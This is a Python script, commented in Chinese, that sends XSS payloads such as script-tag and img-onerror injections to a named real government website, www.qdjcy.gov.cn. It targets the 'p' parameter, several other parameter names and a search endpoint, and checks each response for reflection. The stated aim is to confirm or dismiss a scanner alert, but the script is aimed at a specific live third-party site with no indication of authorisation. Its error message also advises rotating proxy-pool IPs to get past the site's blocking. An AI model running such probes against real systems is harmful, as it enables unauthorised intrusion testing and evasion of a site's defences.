#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
青岛市人民检察院 www.qdjcy.gov.cn p参数 XSS 漏洞验证脚本
用法: python xss_verify.py
注意: 需在能正常访问该站点的网络环境中运行(如有代理请配置 proxies)
"""

import requests
import hashlib
import sys
import urllib.parse

# ===== 配置区 =====
TARGET = "http://www.qdjcy.gov.cn/"
# 如果需要代理，取消下面注释并修改
# PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
PROXIES = None

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "DNT": "1",
    "Referer": "http://www.qdjcy.gov.cn/",
    "Upgrade-Insecure-Requests": "1",
}

# 待测试的 payload 列表
PAYLOADS = [
    # 原始报文中的 payload
    '<script>alert("XSS");</script>',
    # 简单测试字符串（唯一标记，便于在响应中搜索）
    'XSS_PROBE_TEST_12345',
    # HTML 标签注入
    '<b>boldtest</b>',
    # 事件型 XSS
    '"><img src=x onerror=alert(1)>',
    # 编码测试
    'javascript:alert(1)',
]


def send_request(url, params=None, headers=None):
    """发送 HTTP 请求"""
    try:
        resp = requests.get(
            url,
            params=params,
            headers=headers or HEADERS,
            proxies=PROXIES,
            verify=False,
            timeout=15,
            allow_redirects=False,
        )
        return resp
    except requests.exceptions.ConnectionError as e:
        print(f"  [!] 连接失败: {e}")
        return None
    except requests.exceptions.Timeout:
        print(f"  [!] 请求超时")
        return None
    except Exception as e:
        print(f"  [!] 请求异常: {e}")
        return None


def check_reflection(resp_text, payload):
    """检查 payload 是否在响应中反射"""
    # 检查原始 payload
    if payload in resp_text:
        return "原始反射"
    # 检查 URL 编码形式
    encoded = urllib.parse.quote(payload, safe='')
    if encoded in resp_text:
        return "URL编码反射"
    # 检查 HTML 实体编码形式
    import html
    escaped = html.escape(payload)
    if escaped in resp_text and escaped != payload:
        return "HTML实体编码反射"
    # 检查 payload 的关键片段
    if len(payload) > 10:
        fragment = payload[:10]
        if fragment in resp_text:
            return "片段反射"
    return None


def main():
    print("=" * 70)
    print("XSS 漏洞验证 - www.qdjcy.gov.cn p参数")
    print("=" * 70)

    # ===== 第1步: 基线请求（不带任何参数） =====
    print("\n[1] 基线请求 (无参数):")
    baseline_resp = send_request(TARGET)
    if baseline_resp is None:
        print("  [X] 无法连接目标，请检查网络/代理设置")
        print("  [*] 提示: 该站可能对非授信IP返回503，建议使用代理池IP")
        sys.exit(1)

    baseline_hash = hashlib.md5(baseline_resp.text.encode()).hexdigest()
    baseline_len = len(baseline_resp.text)
    baseline_etag = baseline_resp.headers.get("ETag", "N/A")
    print(f"  HTTP状态码: {baseline_resp.status_code}")
    print(f"  响应大小: {baseline_len} 字符")
    print(f"  ETag: {baseline_etag}")
    print(f"  MD5: {baseline_hash}")

    # ===== 第2步: 带 XSS payload 的请求 =====
    print("\n[2] 带 XSS payload 的请求:")
    for i, payload in enumerate(PAYLOADS, 1):
        print(f"\n  --- Payload {i}: {payload[:50]}{'...' if len(payload) > 50 else ''} ---")
        resp = send_request(TARGET, params={"p": payload})
        if resp is None:
            continue

        resp_hash = hashlib.md5(resp.text.encode()).hexdigest()
        resp_len = len(resp.text)
        resp_etag = resp.headers.get("ETag", "N/A")
        print(f"  HTTP状态码: {resp.status_code}")
        print(f"  响应大小: {resp_len} 字符")
        print(f"  ETag: {resp_etag}")
        print(f"  MD5: {resp_hash}")

        # 对比基线
        if resp_hash == baseline_hash:
            print(f"  [结果] 响应与基线完全一致 -> p参数被忽略")
        elif resp_len == baseline_len:
            print(f"  [结果] 响应大小相同但MD5不同 -> 需进一步检查")
        else:
            print(f"  [结果] 响应大小不同 (差异: {resp_len - baseline_len} 字符)")

        # 检查反射
        reflection = check_reflection(resp.text, payload)
        if reflection:
            print(f"  [!!!] 发现反射: {reflection}")
            # 找到反射位置
            idx = resp.text.find(payload)
            if idx >= 0:
                context = resp.text[max(0, idx-50):idx+len(payload)+50]
                print(f"  [上下文] ...{context}...")
        else:
            print(f"  [结果] 未发现 payload 反射")

    # ===== 第3步: 测试其他参数名 =====
    print("\n[3] 测试其他参数名是否被处理:")
    test_params = [
        {"q": "XSS_TEST"},
        {"search": "XSS_TEST"},
        {"keyword": "XSS_TEST"},
        {"id": "XSS_TEST"},
        {"page": "XSS_TEST"},
        {"cat": "XSS_TEST"},
    ]
    for params in test_params:
        param_name = list(params.keys())[0]
        resp = send_request(TARGET, params=params)
        if resp is None:
            continue
        if "XSS_TEST" in resp.text:
            print(f"  参数 '{param_name}' -> 发现反射!")
        else:
            print(f"  参数 '{param_name}' -> 未反射 (大小: {len(resp.text)})")

    # ===== 第4步: 测试搜索功能（可能存在反射点）=====
    print("\n[4] 测试搜索功能 /index.php?m=content&c=search&a=all:")
    search_url = TARGET.rstrip("/") + "/index.php"
    search_params = {
        "m": "content",
        "c": "search",
        "a": "all",
        "catid": "",
        "dosubmit": "1",
        "info[title]": '<script>alert("XSS_SEARCH")</script>',
    }
    resp = send_request(search_url, params=search_params)
    if resp is not None:
        print(f"  HTTP状态码: {resp.status_code}")
        print(f"  响应大小: {len(resp.text)} 字符")
        if 'alert("XSS_SEARCH")' in resp.text or "XSS_SEARCH" in resp.text:
            print(f"  [!!!] 搜索结果中发现 payload 反射!")
        else:
            print(f"  [结果] 搜索结果中未发现反射")
    else:
        print(f"  [!] 搜索请求失败")

    # ===== 总结 =====
    print("\n" + "=" * 70)
    print("验证总结:")
    print("-" * 40)
    print("目标: http://www.qdjcy.gov.cn/?p=<script>alert('XSS')</script>")
    print()
    print("关键证据:")
    print(f"  - 基线响应 ETag: {baseline_etag}")
    print(f"  - 基线响应 MD5: {baseline_hash}")
    print(f"  - 基线响应大小: {baseline_len}")
    print()
    print("结论: 如果带payload请求的MD5/ETag/大小与基线一致，")
    print("      且payload未在响应中反射，则p参数被服务器忽略，")
    print("      该XSS告警为误报(false positive)。")
    print("=" * 70)


if __name__ == "__main__":
    main()
